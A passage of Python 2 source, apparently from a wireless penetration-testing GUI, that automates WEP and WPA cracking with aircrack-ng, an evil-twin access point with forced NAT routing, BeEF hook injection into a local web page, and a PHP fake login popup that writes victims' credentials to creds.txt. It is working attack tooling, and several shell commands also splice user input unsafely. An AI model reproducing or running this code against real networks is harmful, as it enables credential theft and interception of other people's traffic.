    # ~ ifconfig """+wlan_iface+""" 10.0.0.1/24
    # ~ iptables -t nat -F
    # ~ iptables -F
    # ~ iptables -t nat -A POSTROUTING -o """+internet_iface+""" -j MASQUERADE
    # ~ iptables -A FORWARD -i """+wlan_iface+""" -o """+internet_iface+""" -j ACCEPT
    # ~ echo '1' > /proc/sys/net/ipv4/ip_forward""")
    # ~
    # ~
    # ~ wx.MessageBox('Free Internet SSID is launched', 'Info', wx.OK | wx.ICON_INFORMATION)


    ################ FREE INTERNET ################

    ######################### wireless scanner is ready #################
    def wireless_scan(self, e):

        wlan_ifaces = wless_commands.get_monitoring_interfaces()
        if not wlan_ifaces:
            wx.MessageBox('Failed to get a wireless interface. \nTry to resinsert USB wireless card',
                          'Warning/Error',
                          wx.ICON_ERROR | wx.ICON_INFORMATION)
            return

        mon_iface = wlan_ifaces[0]
        try:
            read_only_txt = wx.TextCtrl(self, -1, '**WIRELESS SCAN**\n',
                                        style=wx.TE_MULTILINE | wx.TE_READONLY,
                                        pos=(20, 200), size=(400, 600))
            iw_nets = wless_commands.get_wireless_scan(mon_iface)
            wireless_ssid_file = open('./Modules/wScan.log', 'w')
            for iw_net in iw_nets:
                text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s, Channel: %(channel)s]\n\n'
                        % iw_net)
                read_only_txt.AppendText(text)
                wireless_ssid_file.write(text)

            wireless_ssid_file.close()
            os.system('iw dev ' + mon_iface + ' interface add mon0 type monitor')
            os.system('ifconfig mon0 up')
        except:
            wx.MessageBox('Failed to get a scan of wireless networks.',
                          'Warning/Error',
                          wx.ICON_ERROR | wx.ICON_INFORMATION)
            logging.error(traceback.format_exc())

        wx.MessageBox('Deep Scanner to be launched\nGo to Action -> start sniffer', 'Information', wx.ICON_INFORMATION)
        self.bring_wlan_devs_up(self.get_net_devices())
        from Modules import full_wifi_sniffer
        full_wifi_sniffer.main()

    # ~
    ######################### wireless scanner is ready #################


    ######################### probe scanner is ready #################
    def helpMenu(self, e):
        try:
            os.system("firefox ./Modules/wiki/index.html &")
        except:
            wx.MessageBox('Oops, Somthing went wrong here.', 'Warning', wx.ICON_INFORMATION)

    def bring_wlan_devs_up(self, devices=[]):
        """Bring up all wlan interfaces."""
        if not devices:
            devices = sorted(self.get_net_devices())

        for dev in devices:
            if re.search(r'^wlan[0-9]$', dev):
                logging.debug('ifup at %s', dev)
                os.system("ifconfig %s up" % dev)
                os.system("iw dev %s interface add mon0 type monitor" % dev)
                os.system("ifconfig mon0 up")

    def get_net_devices(self):
        """Return list of network devices."""
        with open('/proc/net/dev', 'r') as fhandle:
            lines = [line.lstrip() for line in fhandle.readlines()]

        return [line.split(':', 1)[0] for line in lines
                if not (line.startswith('face') or line.startswith('Inter-'))]

    def probRequest(self, e):
        self.bring_wlan_devs_up(self.get_net_devices())
        from Modules import full_wifi_sniffer
        full_wifi_sniffer.main()
        # ~ print 'Following files will be removed'
        os.system('rm ./Modules/connection_list.txt; rm ./Modules/access_list.txt; rm ./Modules/probe_list.txt')

    # ~ print 'It is removed'
    # ~ wlan_ifaces = wless_commands.get_monitoring_interfaces()
    # ~ if not wlan_ifaces:
    # ~ wx.MessageBox('Failed to get a wireless interface.',
    # ~ 'Warning/Error',
    # ~ wx.ICON_ERROR | wx.ICON_INFORMATION)
    # ~ return
    # ~
    # ~ iface = wlan_ifaces[0]
    # ~ open('./Modules/prob_request.txt', 'w').close()
    # ~ wless_commands.bring_wlan_devs_up([iface])
    # ~
    # ~ print 'airmon-ng start is created'
    # ~ wx.MessageBox('Small area : < 300\nMedium are: < 1000\nLarge area: 3000-4000\nOr You can go further up', 'Probe Capture Value Hints', wx.OK | wx.ICON_INFORMATION)
    # ~ prob_packets = str(self.ask(message = 'Enter the Number for Probe Request Packets Capture')).strip()
    # ~
    # ~ try:
    # ~
    # ~ read_only_txt = wx.TextCtrl(self, -1, '**Please Wait...\nNow Performing Probe Scan**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
    # ~
    # ~
    # ~ wless_commands.start_probing(int(prob_packets))
    # ~
    # ~ with open('./Modules/prob_request.txt') as f:
    # ~ for i in f:
    # ~ if i.strip() != '':
    # ~ read_only_txt.AppendText(str(i))
    # ~
    # ~ monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
    # ~ os.system("airmon-ng stop "+str(monitoring_interface))
    # ~ except:
    # ~ wx.MessageBox('Please try to Kill Srv', 'Warning', wx.ICON_INFORMATION)


    ######################### probe scanner is ready #################

    # ~ def test(self,e):
    # ~ self.new = NewWindow(parent=None, id=-1)
    # ~ self.new.Show()
    def test(self, e):
        self.new = EvilWindow(parent=None, id=-1)
        self.new.Show()

    def wpe_ssid_get(self, e):
        os.system('airmon-ng check kill')
        import wpa2_enterprise_module
        wpa2_enterprise_module.main()

    # ~ def ask(parent=None, message='', default_value=''):
    # ~ dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
    # ~ dlg.ShowModal()
    # ~ result = dlg.GetValue()
    # ~ dlg.Destroy()
    # ~ return result
    # ~
    # ~ user = str(ask(message = 'Enter the WPA2 Entr.SSID')).strip()
    # ~ if user != '':
    # ~ self.wpa2_entr_crack(user)
    # ~ else:
    # ~ wx.MessageBox('You did not enter SSID or Canceled the attack', 'Warning', wx.ICON_INFORMATION)

    def captureIV(self, e):
        wlan_ifaces = wless_commands.get_monitoring_interfaces()
        if not wlan_ifaces:
            wx.MessageBox('mon0 doesn\'t exist',
                          'Warning', wx.ICON_INFORMATION)
            return

        wlan_iface = wlan_ifaces[0]
        wless_commands.bring_wlan_devs_up([wlan_iface])
        wless_commands.start_airmon([wlan_iface])

        mon_ifaces = wless_commands.get_monitoring_interfaces()
        mon_iface = mon_ifaces[0]
        # ~ print 'mon0 is created'
        os.system("gnome-terminal -x airodump-ng " + mon_iface + " &")

        # ~ print 'Attack is launched  is created'
        def ask(parent=None, message='', default_value=''):
            dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
            dlg.ShowModal()
            result = dlg.GetValue()
            dlg.Destroy()
            return result

        ask_mac = str(ask(message='Enter the AP MAC Address')).strip()
        self.target_mac = ask_mac
        os.system("gnome-terminal -x airodump-ng -c 9 --bssid " + ask_mac + " -w output " + mon_iface + " &")

    def fakeAPauth(self, e):
        wlan_ifaces = wless_commands.get_monitoring_interfaces()
        if not wlan_ifaces:
            wx.MessageBox('monitor doesn\'t exist',
                          'Warning', wx.ICON_INFORMATION)
            return

        mon_iface = wlan_ifaces[0]
        wless_commands.bring_wlan_devs_up([mon_iface])

        def ask(parent=None, message='', default_value=''):
            dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
            dlg.ShowModal()
            result = dlg.GetValue()
            dlg.Destroy()
            return result

        ask_mac = str(ask(message='Enter the AP MAC Address')).strip()
        host_mac = str(ask(message='Enter the HOST MAC Address')).strip()
        ssid = str(ask(message='Enter victim SSID')).strip()

        os.system(
            "gnome-terminal -x aireplay-ng -1 0 -e " + ssid + " -a " + ask_mac + " -h " + host_mac + " " + mon_iface + " &")

    def wep_replay(self, e):
        try:

            def ask(parent=None, message='', default_value=''):
                dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
                dlg.ShowModal()
                result = dlg.GetValue()
                dlg.Destroy()
                return result

            ask_mac = str(ask(message='Enter the AP MAC Address')).strip()
            host_mac = str(ask(message='Enter the HOST MAC Address')).strip()

            monitoring_interface = wless_commands.get_monitoring_interfaces()[0]

            os.system(
                "gnome-terminal -x aireplay-ng -3 -b " + ask_mac + " -h " + host_mac + " " + monitoring_interface + " &")
        except:
            wx.MessageBox('Something went wrong', 'Warning', wx.ICON_INFORMATION)

    def wep_crack(self, e):

        os.system("gnome-terminal -x aircrack-ng -b " + captureIV.target_mac + " output*.cap &")
        os.system("gnome-terminal -x aircrack-ng -K -b " + captureIV.target_mac + " output*.cap &")

    def beef_attack(self,e):
        # print 'Hello World'

        os.system('beef-xss')

        time.sleep(2)
        os.system('firefox http://127.0.0.1:3000/ui/panel &')


        beef_script = '''
        <html>
<body>
<script src="http://10.0.0.1:3000/hook.js"></script>
</body>
</html>
        '''

        if os.path.exists('/var/www/html/index.html'):
            os.system('mv /var/www/html/index.html /var/www/html/index-bkp.html')

        bfile = open('/var/www/html/index.html','w')
        bfile.write(beef_script)
        bfile.close()


        os.system('''iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
        iptables --append FORWARD --in-interface at0 -j ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
        iptables -t nat -A POSTROUTING -j MASQUERADE''')

    def fakepopup(self, e):

        def ask(parent=None, message='', default_value=''):
            dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
            dlg.ShowModal()
            result = dlg.GetValue()
            dlg.Destroy()
            return result

        target_url = str(ask(message='Where do you want to redirct the users after')).strip()

        phpcode = """<?php

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('visitors.log', $line . PHP_EOL, FILE_APPEND);

if((empty($_SERVER['PHP_AUTH_USER']) or empty($_SERVER['PHP_AUTH_PW'])) and isset($_REQUEST['BAD_HOSTING']) and preg_match('/Basic\s+(.*)$/i', $_REQUEST['BAD_HOSTING'], $matc))
        list($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) = explode(':', base64_decode($matc[1]));

  if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Text to send if user hits Cancel button\n';
    exit;
  } else {
    
     $file = 'creds.txt';

     $user_pass = "{$_SERVER['PHP_AUTH_USER']} : {$_SERVER['PHP_AUTH_PW']} \n";

     file_put_contents($file, $user_pass, FILE_APPEND);

     header( 'Location: %s');

  }
?>

""" % target_url

        indexfile = open('/var/www/html/index.php', 'wb')
        indexfile.write(phpcode)
        indexfile.close()

        indexfile2 = open('/var/www/html/index.php', 'wb')
        indexfile2.write(phpcode)
        indexfile2.close()

        htaccess = open('/var/www/html/.htaccess', 'wb')
        htaccess.write("""<IfModule mod_rewrite.c>
   RewriteEngine on
   
   RewriteCond %{QUERY_STRING} ^$
   RewriteRule ([^\s]+).php$ $1.php?BAD_HOSTING=%{HTTP:Authorization}
   
   RewriteCond %{QUERY_STRING} ^(.+)$
   RewriteRule ([^\s]+).php $1.php?%1&BAD_HOSTING=%{HTTP:Authorization}
</IfModule>""")
        htaccess.close()

        htaccess2 = open('/var/www/html/.htaccess', 'wb')
        htaccess2.write("""<IfModule mod_rewrite.c>
   RewriteEngine on
   
   RewriteCond %{QUERY_STRING} ^$
   RewriteRule ([^\s]+).php$ $1.php?BAD_HOSTING=%{HTTP:Authorization}
   
   RewriteCond %{QUERY_STRING} ^(.+)$
   RewriteRule ([^\s]+).php $1.php?%1&BAD_HOSTING=%{HTTP:Authorization}
</IfModule>""")
        htaccess2.close()

        os.system('''iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE
''')
        os.system('''rm /var/www/html/index.html''')

    def wpa2_entr_crack(self, SSID):

        ##~ configuration = """interface=wlan0
        ##~ driver=nl80211
        ##~ ssid="%s"
        ##~ logger_stdout=-1
        ##~ logger_stdout_level=0
        ##~ dump_file=/tmp/hostapd.dump
        ##~ ieee8021x=1
        ##~ eapol_key_index_workaround=0
        ##~ own_ip_addr=127.0.0.1
        ##~ auth_server_addr=127.0.0.1
        ##~ auth_server_port=1812
        ##~ auth_server_shared_secret=testing123
        ##~ wpa=1
        ##~ channel=1
        ##~ wpa_pairwise=TKIP CCMP""" %SSID
        # ~

        # ~ iface = wless_commands.get_monitoring_interfaces()[0]

        configuration = """interface=%s
driver=nl80211
ssid=%s
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=6
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""" % (iface, SSID)

        hostapd_conf = open('./Modules/hostapd-wpe.conf', 'wb')
        hostapd_conf.write(configuration)
        hostapd_conf.close()
        os.system("/sbin/ldconfig -v")
        os.system("gnome-terminal -x radiusd -X &")
        os.system("/usr/local/etc/raddb/certs/bootstrap &")
        #		#~ os.system("airmon-ng check kill")
        #		#~ print 'it is a about to sleep'

        time.sleep(5)
        #		#~ print 'came back from sleep'

        iface = wless_commands.get_monitoring_interfaces()[0]

        #		#~ os.system("airmon-ng start "+iface+" &")
        #		#~ print 'airmong ng is started'


        os.system("gnome-terminal -x hostapd ./Modules/hostapd-wpe.conf &")
        #		#~ print 'hostapd started'
        #		#~ os.system("gnome-terminal -x tail -f /usr/local/var/log/radius/freeradius-server-wpe.log &")
        #		#~ print 'tail is started'
        wx.MessageBox('WPA2 Enterpise attack started', 'Info', wx.OK | wx.ICON_INFORMATION)

    def infernalWireless(self, e):

        import InfernalWirelessAttack
        InfernalWirelessAttack.main()

    # ~ self.new = infernal_wireless(parent=None, id=-1)
    # ~ self.new.Show()

    def wpa_crack(self, e):
        self.new = WPA2_crack(parent=None, id=-1)
        self.new.Show()

    def wp2_cracker(self, e):
        self.new = wpa_cracker(parent=None, id=-1)
        self.new.Show()

    def wpa2ent_cracker(self, e):
        self.new = wpa2enterprise_cracker(parent=None, id=-1)
        self.new.Show()

    def viewFakedPage(self, e):
        # self.new = MyHtmlFrame(parent=None, id=-1)
        # self.new.Show()
        os.system('firefox http://localhost/index.html &')


class wpa_cracker(wx.Frame):
    def __init__(self, parent, id):

        wx.Frame.__init__(self, parent, id)

        panel = wx.Panel(self, -1)
        # wx.StaticText(panel, -1, 'See Logs for results\ncaptures/key_found.txt', (45, 25), style=wx.ALIGN_CENTRE)

        global mySSID

        self.CreateStatusBar()

        # ~ menuBar = wx.MenuBar()
        # ~ menu = wx.Menu()
        # ~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
        # ~ menuBar.Append(menu, "&Load Dictionary File")
        # ~ self.SetMenuBar(menuBar)
        # ~ self.Bind(wx.EVT_MENU, self.openfile, id=99)


        wbtn = wx.Button(panel, label='Choose capture file', pos=(10, 40))
        wbtn.Bind(wx.EVT_BUTTON, self.openfile)

        capbtn = wx.Button(panel, label='Choose wordlist file', pos=(10, 80))
        capbtn.Bind(wx.EVT_BUTTON, self.openhash)

        mySSID = wx.TextCtrl(panel, -1, "Enter SSID", size=(200, 30), pos=(10, 120))

        brutebtn = wx.Button(panel, label='Start bruteforce', pos=(10, 160))
        brutebtn.Bind(wx.EVT_BUTTON, self.bruteforce)

    myssid = ""
    wordlist = ""
    capturelist = ""

    def openhash(self, event):

        dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)

        if dlg.ShowModal() == wx.ID_OK:
            path = dlg.GetPath()
            self.mypath = os.path.basename(path)
            self.SetStatusText("You selected: %s" % self.mypath)

        self.wordlist = str(path)

        dlg.Destroy()

    def openfile(self, event):

        dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)

        if dlg.ShowModal() == wx.ID_OK:
            path = dlg.GetPath()
            self.mypath = os.path.basename(path)
            self.SetStatusText("You selected: %s" % self.mypath)

            # os.system("gnome-terminal -x aircrack-ng -w "+str(path)+" captures/*.cap -l captures/key_found.txt")
            self.capturelist = str(path)
            dlg.Destroy()

    def bruteforce(self, event):

        # ~ os.system("gnome-terminal -x aircrack-ng -w "+self.wordlist+" "+self.capturelist+" -l captures/key_found.txt")
        print self.wordlist
        print self.capturelist
        print mySSID.GetValue()

        # ~ test = subprocess.Popen(["aircrack-ng","-w",self.wordlist,self.capturelist,"-l","captures/key_found.txt"], stdout=subprocess.PIPE)


        test = subprocess.Popen(
            ["aircrack-ng", self.capturelist, "-w", self.wordlist, "-e", str(mySSID.GetValue()), "-l", "key_found.txt"],
            stdout=subprocess.PIPE)
        # ~ test = subprocess.Popen(["aircrack-ng","-w",self.capturelist,"-D",self.wordlist,"-e",str(mySSID.GetValue()),"-l","captures/key_found.txt"], stdout=subprocess.PIPE)

        # ~ print "aircrack-ng","-w",self.capturelist,"-D",self.wordlist,"-l","captures/key_found.txt"
        # ~ print "aircrack-ng","-w",self.capturelist,"-D",self.wordlist,"-e",str(mySSID.GetValue()),"-l","captures/key_found.txt"



        output = test.communicate()[0]
        if 'Passphrase not in dictionary ' in output:
            # ~ wx.MessageBox('It is cracking now', 'Result', wx.ICON_ERROR | wx.ICON_INFORMATION)
            wx.MessageBox("Password not in the dictionary", 'Result', wx.ICON_ERROR | wx.ICON_INFORMATION)
        else:
            passkey = open('key_found.txt', 'r').read()
            # ~ passphrase_found = subprocess.Popen(['grep key_found.txt -e "KEY FOUND"'])
            # ~ stripped_pass = str(passphrase_found).replace('\n','')
            wx.MessageBox('Password found: ' + passkey, 'Result', wx.ICON_INFORMATION)


        # ~ print self.capturelist
        # ~ print self.wordlist
        # ~


class wpa2enterprise_cracker(wx.Frame):
    def __init__(self, parent, id):
        wx.Frame.__init__(self, parent, id)

        panel = wx.Panel(self, -1)
        # wx.StaticText(panel, -1, 'See Logs for results\ncaptures/key_found.txt', (45, 25), style=wx.ALIGN_CENTRE)

        g_challenge = ""
        g_response = ""
        filepath = ""

        self.CreateStatusBar()

        # ~ menuBar = wx.MenuBar()
        # ~ menu = wx.Menu()
        # ~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
        # ~ menuBar.Append(menu, "&Load Dictionary File")
        # ~ self.SetMenuBar(menuBar)
        # ~ self.Bind(wx.EVT_MENU, self.openfile, id=99)


        wbtn = wx.Button(panel, -1, label='Choose wordlist', pos=(10, 40))
        wbtn.Bind(wx.EVT_BUTTON, self.openfile)

        challenge = wx.TextCtrl(panel, -1, "Enter the Challenge", size=(250, 30), pos=(10, 80))
        response = wx.TextCtrl(panel, -1, "Enter the Response", size=(250, 30), pos=(10, 120))

        self.g_challenge = challenge
        self.g_response = response

        # ~ capbtn = wx.Button(panel, label='Choose capture file',pos=(10,80))
        # ~ capbtn.Bind(wx.EVT_BUTTON, self.openhash)

        brutebtn = wx.Button(panel, -1, label='Start bruteforce', pos=(10, 155))
        brutebtn.Bind(wx.EVT_BUTTON, self.bruteforce)

    wordlist = ""

    def openhash(self, event):

        dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)

        if dlg.ShowModal() == wx.ID_OK:
            path = dlg.GetPath()
            self.mypath = os.path.basename(path)
            self.SetStatusText("You selected: %s" % self.mypath)

        self.wordlist = str(path)
        print self.wordlist

        dlg.Destroy()

    def openfile(self, event):

        dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)

        if dlg.ShowModal() == wx.ID_OK:
            path = dlg.GetPath()
            self.mypath = os.path.basename(path)
            self.SetStatusText("You selected: %s" % self.mypath)

            # os.system("gnome-terminal -x aircrack-ng -w "+str(path)+" captures/*.cap -l captures/key_found.txt")
            self.capturelist = str(path)
            dlg.Destroy()
            # ~ print self.capturelist+str(self.mypath)
            self.filepath = self.capturelist

    def bruteforce(self, event):

        # ~ print self.g_challenge.GetValue()
        # ~ print self.g_response.GetValue()
        # ~ print self.wordlist
        # ~ print 'wordlist should be here'


        # ~ os.system("gnome-terminal -x asleap -C "+self.g_challenge+" -R "+self.g_response+" -W "+self.wordlist+ " read")
        try:

            print str(self.wordlist)
            test = subprocess.Popen(
                ["asleap", "-C", str(self.g_challenge.GetValue()), "-R", str(self.g_response.GetValue()), "-W",
                 str(self.filepath)], stdout=subprocess.PIPE)
            output = test.communicate()[0]

        except Exception:
            wx.MessageBox('Make sure to Correct Challenge/Response or provide a dictionary', 'Error', wx.ICON_ERROR)
        # ~ mychall = self.g_challenge.GetValue()
        # ~ myres = self.g_response.GetValue()




        if "Sorry it didn't work out" not in output:
            wx.MessageBox(output, 'Result', wx.ICON_ERROR | wx.ICON_INFORMATION)
        else:
            wx.MessageBox('Password not in the dictionary', 'Result', wx.ICON_ERROR | wx.ICON_INFORMATION)

        # ~ print self.g_challenge
        # ~ print self.g_response


class MyHtmlFrame(wx.Frame):
    def __init__(self, parent, id):
        wx.Frame.__init__(self, parent, id, size=(800, 600))
        html = wx.html.HtmlWindow(self)
        if "gtk2" in wx.PlatformInfo:
            html.SetStandardFonts()

        html.LoadPage("http://localhost/index.html")


class MyHtmlFrame2(wx.Frame):
    def __init__(self, parent, title):
        wx.Frame.__init__(self, parent, -1, title)
        html = wx.html.HtmlWindow(self)
        html.SetPage(
            "<font color=\"red\">This tool was developed to aid penetration tester in evaluating the security of wireless network</font> !!!! "
            "<br><font color=\"red\"></font>")


class authorwindows(wx.Frame):
    def __init__(self, parent, title):
        wx.Frame.__init__(self, parent, -1, title)
        html = wx.html.HtmlWindow(self)
        html.SetPage(
            "<h4>Author: </h4>3nt0py<br>Email: 3ntr0py1337[at]gmail[dot]com<br>LinkedIn: <a href='https://ae.linkedin.com/'> https://ae.linkedin.com/</a><br><h4>Contributors:</h4><br>@ndrix and zstyblik")


class suggestions(wx.Frame):
    def __init__(self, parent, title):
        wx.Frame.__init__(self, parent, -1, title)
        html = wx.html.HtmlWindow(self)
        html.SetPage("For suggestions and all other questions email me @ 3ntr0py1337[at]gmail[dot]com")


class wifi_card_info(wx.Frame):
    def __init__(self, parent, title):
        wx.Frame.__init__(self, parent, -1, title)
        net_devs = wless_commands.get_net_devices()
        lines = []
        for dev in sorted(net_devs):
            info = wless_commands.get_net_device_info(dev)
            if not info:
                logging.error('Failed to get information about device %s.', dev)
                continue
            elif not info['wireless']:
                continue

            lines.append(('<li>%s, MAC %s, link state: %s'
                          % (dev, info['mac_address'], info['link_state'])))

        if not lines:
            text = 'No wireless card found?'
        else:
            text = '<ul>\n%s\n</ul>\n' % '\n'.join(lines)

        html = wx.html.HtmlWindow(self)
        html.SetPage(text)


class EvilWindow(wx.Frame):
    def __init__(self, parent, id):

        wx.Frame.__init__(self, parent, id, 'New Window', size=(600, 300))
        wx.Frame.CenterOnScreen(self)
        # self.new.Show(False))
        panel = wx.Panel(self, -1)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.listbox = wx.ListBox(panel, -1)
        hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
        btnPanel = wx.Panel(panel, -1)
        vbox = wx.BoxSizer(wx.VERTICAL)
        global outboutiface
        global cb
        outboutiface = ''

        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))

        ############# get Internet interface card ########
        test = subprocess.Popen(["ls", "/sys/class/net/"], stdout=subprocess.PIPE)
        (out, err) = test.communicate()
        mylist = out.split()
        ############# get Internet interface card ########

        # ~ select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        # ~ test = subprocess.Popen(["ls", "/sys/class/net/"], stdout=subprocess.PIPE)
        # ~ (out,err) = test.communicate()
        # ~ mylist= out.split()


        cb = wx.ComboBox(btnPanel, -1, choices=mylist, style=wx.CB_READONLY, size=(100, 30))
        # ~ cb.SetSelection(cb.GetValue())

        # ~ global outboutiface


        st = wx.StaticText(btnPanel, -1, label='Select Outbund\nInterface')
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))

        self.Bind(wx.EVT_BUTTON, self.ScanW, id=-1)

        attack.Bind(wx.EVT_BUTTON, self.attack_W)

        # self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
        vbox.Add((-1, 20))
        vbox.Add(select)
        vbox.Add(st)
        vbox.Add(cb)

        vbox.Add(attack)

        btnPanel.SetSizer(vbox)
        hbox.Add(btnPanel, 0.6, wx.EXPAND | wx.RIGHT, 20)
        panel.SetSizer(hbox)
        self.Centre()
        self.Show(True)

    app_select = ''

    def ScanW(self, event):
        with open('./Modules/wScan.log') as f:
            for i in f:
                self.listbox.Append(i)

    def evil_twin_attack(self, SSID):
        output = Popen(["iwconfig"], stdout=PIPE).communicate()[0]
        wireless_interface = ""
        mon_iface = ""
        if "wlan" in output:
            wireless_interface = output[0:6].strip()

        # mon_interface = Popen(["airmon-ng", "start", wireless_interface], stdout=PIPE).communicate()[0]

        # ~ hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
        hostapd = open('hostapd-evil.conf', 'wb')
        # ~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
        config_file = "interface=" + wireless_interface + "\ndriver=nl80211\nssid=" + str(
            SSID.replace('[SSID:', '')).strip() + "\nchannel=1\n#enable_karma=1\n"
        hostapd.write(config_file)
        hostapd.close()
        os.system("gnome-terminal -x hostapd hostapd-evil.conf &")

        os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
			cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
""")

        os.system("service dnsmasq start")

        iface = wless_commands.get_monitoring_interfaces()[0]

        # ~ myoutbound_interface = cb.GetValue()
        # ~ print 'Current fake AP combo box is ' + str(outboutiface)
        global outboutiface
        global cb
        outboutiface = cb.GetValue()

        os.system("""ifconfig %s up
			ifconfig %s 10.0.0.1/24

			iptables -t nat -F
			iptables -F
			iptables -t nat -A POSTROUTING -o %s -j MASQUERADE
			iptables -A FORWARD -i wlan0 -o %s -j ACCEPT
			echo '1' > /proc/sys/net/ipv4/ip_forward""" % (iface, iface, outboutiface, outboutiface))

        print """ifconfig %s up
			ifconfig %s 10.0.0.1/24

			iptables -t nat -F
			iptables -F
			iptables -t nat -A POSTROUTING -o %s -j MASQUERADE
			iptables -A FORWARD -i wlan0 -o %s -j ACCEPT
			echo '1' > /proc/sys/net/ipv4/ip_forward""" % (iface, iface, outboutiface, outboutiface)

        ######## Debugging purpose
        print 'IP table is created'

    def attack_W(self, e):
        sel = self.listbox.GetSelection()
        text = self.listbox.GetString(sel)
        text_split = str(text).split(', ')
        app_select = text_split[0].replace("['SSID:", "").replace("'", "").strip()
        ##### remove ['SSID:
        self.evil_twin_attack(app_select)
        global outboutiface
        global cb
        outboutiface = cb.GetValue()
        print 'current interface is ' + str(outboutiface)

        wx.MessageBox('Evil Twin Attack on ' + str(text) + ' is started', 'Info', wx.OK | wx.ICON_INFORMATION)
        ######## close the child frame

        self.Show(False)
        open('./Modules/wScan.log', 'w').close()


################## wpa2 crack capture is finished##########	
class WPA2_crack(wx.Frame):
    def __init__(self, parent, id):

        wx.Frame.__init__(self, parent, id, 'WPA_crack', size=(600, 300))
        wx.Frame.CenterOnScreen(self)
        # self.new.Show(False))
        panel = wx.Panel(self, -1)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.listbox = wx.ListBox(panel, -1)

        hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
        btnPanel = wx.Panel(panel, -1)
        vbox = wx.BoxSizer(wx.VERTICAL)

        self.nDeviceList = wx.ComboBox(btnPanel, -1, value='Wireless Interface', size=(100, 30), pos=(2, 100),
                                       choices=wless_commands.get_net_devices())

        select = wx.Button(btnPanel, -1, 'Select SSID', size=(100, 30))
        attack = wx.Button(btnPanel, -1, 'Attack', size=(100, 30))

        self.Bind(wx.EVT_BUTTON, self.wireless_scan, id=-1)

        attack.Bind(wx.EVT_BUTTON, self.attack_WPA2)

        # self.Bind(wx.EVT_LISTBOX_DCLICK, self.OnRename)
        vbox.Add((-1, 20))
        # ~ vbox.Add(self.nDeviceList)
        vbox.Add(select)
        vbox.Add(attack)

        btnPanel.SetSizer(vbox)
        hbox.Add(btnPanel, 0.6, wx.EXPAND | wx.RIGHT, 20)
        panel.SetSizer(hbox)
        self.Centre()
        self.Show(True)

    app_select = ''

    def wireless_scan(self, event):
        wlan_ifaces = wless_commands.get_monitoring_interfaces()
        if not wlan_ifaces:
            wx.MessageBox('make sure you have mon0 interface',
                          'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
            return

        wlan_iface = wlan_ifaces[0]
        try:
            if str(self.nDeviceList.GetValue()) != '':

                iw_nets = wless_commands.get_wireless_scan(self.nDeviceList.GetValue())
                iw_scan_file = open('./Modules/wScan.log', 'w')
                for iw_net in iw_nets:
                    text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s, Channel: %(channel)s]\n'
                            % iw_net)
                    self.listbox.Append(text)
                    iw_scan_file.write(text)

                iw_scan_file.close()
            else:
                wx.MessageBox('Please select wireless interface',
                              'Warning/Error', wx.ICON_INFORMATION)

        except Exception:
            wx.MessageBox('Failed to get a scan of wireless networks.',
                          'Warning/Error',
                          wx.ICON_ERROR | wx.ICON_INFORMATION)
            logging.error(traceback.format_exc())

    def wpa_crack_key(self, SSID, channel):
        wlan_ifaces = wless_commands.get_monitoring_interfaces()
        wlan_iface = wlan_ifaces[0]
        wless_commands.start_airmon([wlan_iface])

        mon_ifaces = wless_commands.get_monitoring_interfaces()
        mon_iface = mon_ifaces[0]
        # os.system("mkdir capture")
        print 'wpa2 hack is started'
        ##os.system("airodump-ng --essid "+str(SSID)+" --write "+str(SSID)+"_crack mon0")
